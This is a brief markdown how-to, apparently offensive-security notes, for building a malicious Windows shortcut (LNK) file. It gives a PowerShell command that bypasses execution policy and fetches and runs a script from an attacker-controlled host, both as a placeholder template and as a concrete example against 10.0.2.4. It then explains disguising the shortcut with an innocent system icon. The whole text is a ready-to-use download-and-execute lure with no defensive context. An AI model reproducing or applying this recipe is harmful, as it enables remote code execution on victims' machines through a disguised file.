# How to create LNK file
- go to windows machine
- on desktop create shortcut
- in `type the location of the item` put
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -c "iex (iwr -UseBasicParsing http://<attacker_address>:<attacker_port>/<name_of_remote_malicious_ps_script>.ps1)"
```
- for example
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -c "iex (iwr -UseBasicParsing http://10.0.2.4/host.ps1)"
```
- Go to properties and Change Icon
- Into `Look for icons in the file` put `C:\Windows\System32\imageres.dll` and choose anything that relevant